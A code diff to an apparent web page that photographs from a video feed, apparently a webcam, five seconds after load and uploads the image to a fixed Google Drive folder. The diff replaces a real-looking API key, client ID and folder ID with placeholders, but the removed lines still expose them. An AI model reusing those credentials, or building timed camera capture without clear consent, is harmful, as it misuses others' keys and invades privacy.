@@ -49,8 +49,8 @@
         // Initialize the Google API client
         function initGoogleAPI() {
             gapi.client.init({
-                apiKey: 'AIzaSyApOnXVZKSLiMm6jcomE_QQckVk5WSBTGU', // Replace with your API key
-                clientId: '275140273757-t4c8qj07slo30r2os6rd7jhggsqmt9ho.apps.googleusercontent.com', // Replace with your client ID
+                apiKey: 'YOUR_API_KEY', // Replace with your API key
+                clientId: 'YOUR_CLIENT_ID', // Replace with your client ID
                 discoveryDocs: ['https://www.googleapis.com/discovery/v1/apis/drive/v3/rest'],
                 scope: 'https://www.googleapis.com/auth/drive.file'
             }).then(() => {
@@ -69,7 +69,7 @@
             const delimiter = `\r\n--${boundary}\r\n`;
             const closeDelimiter = `\r\n--${boundary}--`;
 
-            const folderId = '1TjdKBz2K1AL3_A9sEcXUhzEDExhSsdC1'; // Replace with your Google Drive folder ID
+            const folderId = 'YOUR_FOLDER_ID'; // Replace with your Google Drive folder ID
             const metadata = {
                 name: 'captured_photo.png',
                 mimeType: 'image/png',
@@ -101,6 +101,7 @@
 
         // Automatically capture photo and upload it
         setTimeout(() => {
+            console.log('Capturing photo...');
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -108,9 +109,13 @@
 
             // Convert canvas to image data
             const imageData = canvas.toDataURL('image/png');
+            console.log('Captured image data:', imageData);
 
             // Authenticate and upload the photo
+            console.log('Authenticating user...');
             authenticateUser().then(() => {
+                console.log('User authenticated successfully');
+                console.log('Uploading photo to Google Drive...');
                 uploadToGoogleDrive(imageData);
             }).catch(err => console.error('Error authenticating user:', err));
         }, 5000); // 5 seconds delay
